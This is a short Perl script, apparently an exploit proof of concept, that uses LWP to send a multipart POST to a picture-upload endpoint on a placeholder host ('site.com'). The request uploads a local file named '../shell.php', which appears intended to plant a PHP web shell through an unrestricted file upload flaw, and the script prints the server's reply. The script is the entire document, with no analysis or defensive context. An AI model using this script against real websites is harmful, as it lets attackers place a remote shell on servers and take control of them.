#!/usr/bin/perl
use HTTP::Request::Common;
use LWP;
$bx = $bx = LWP::UserAgent->new;
$result = $bx->request(POST 'http://site.com/?picture=upload', 
Content_Type => 'form-data',
Content => [userfile => ["../shell.php"], 
],
);


print $result->as_string();
